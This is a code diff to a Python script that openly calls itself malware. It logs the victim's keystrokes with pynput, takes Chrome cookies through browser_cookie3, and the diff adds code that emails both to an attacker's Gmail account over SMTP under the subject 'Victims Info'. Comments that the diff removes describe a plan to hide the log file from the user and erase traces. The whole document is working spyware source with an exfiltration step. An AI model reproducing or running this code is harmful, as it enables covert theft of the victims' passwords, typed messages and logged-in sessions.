@@ -2,27 +2,27 @@ from pynput import keyboard
 import browser_cookie3
 import os 
 import json
+import smtplib
 
-#Notes for next update:
-#For now store it in a text file that is visible to the user
-#Later on, to hide this so the user is unaware that our malware is creating a text file, we will store it runtime,
-#And use SMTP to send it over a network, while removing traces of the log file (Week 6)
-#Next week we will get the cookie browser information, maybe somehow store this with our logfile, and then send via SMTP 
 
-logs = open("log.txt", "w")
+hackers_email = '______'
+hackers_pw = '______'
+
+keylogs = []
 def on_press(key):
     try:
         #Writes alphanumerical characters to our log file
-        logs.write('{0}\n'.format(key.char))
+        keylogs.append('{0}\n'.format(key.char))
     except AttributeError:
         #Since pynput will throw an attribute error when typing a special key i.e holding shift
         #The exception will catch this and still write to our log file
-        logs.write('{0}\n'.format(key))
+        keylogs.append('{0}\n'.format(key))
 def on_release(key):
     if key == keyboard.Key.esc:
-        logs.close()
+        #logs.close()
         # Stop listener
         return False
+    
 
 # Collect events until released
 with keyboard.Listener(
@@ -36,6 +36,28 @@ listener = keyboard.Listener(
     on_release=on_release)
 listener.start()
 cj = browser_cookie3.chrome()
+payload = {}
+payload['Keylogs'] = keylogs
+payload['Cookies'] = cj
+
+#Setup SMTP server in order to exfiltrate victim's information
+sent_from = hackers_email
+to = hackers_email
+subject = "Victims Info"
+victims_info_email = """\
+Subject: %s
+
+%s
+""" %(subject, payload)
+with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+    server.login(hackers_email, hackers_pw)
+    server.ehlo()
+    server.sendmail(sent_from, to, victims_info_email.encode("utf8"))
+    server.close()
+    print("Successfully sent")
+
+
+
 
 
 
